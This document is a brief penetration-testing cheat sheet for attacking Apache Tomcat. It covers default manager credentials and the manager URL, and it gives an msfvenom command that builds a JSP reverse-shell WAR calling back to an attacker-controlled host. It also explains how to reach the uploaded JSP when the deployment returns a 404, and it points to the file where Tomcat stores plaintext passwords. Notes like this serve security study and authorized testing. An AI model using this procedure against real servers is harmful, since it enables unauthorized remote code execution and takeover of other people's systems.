# Tomcat enumeration

## Checks
- Check if the Tomcat version is vulnerable
- Test for weak credentials
- Try to connect as admin and get code execution via a WAR file

## Default credentials
- https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
- Examples :
	- tomcat : s3cret
	- tomcat : tomcat

## Tomcat administration page
- http://10.10.10.10:8080/manager/html

## Generate a WAR payload using metasploit
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.115.128 LPORT=1234 -f war > shell.war
```

Notes:
- It is possible, some time, after uploading a WAR file we get a 404 not found.
   - A WAR file is basicaly a ZIP archive with a .JSP file inside which holds the code.
- In order to bypass this 404, we can access the folder for which we get a 404 and add to the URL the .JSP file
   - This will eventualy execute the malicious code

## Tomcat user and password are stored in clear text in
- < Tomcat-installation-directory >/conf/tomcat-users.xml


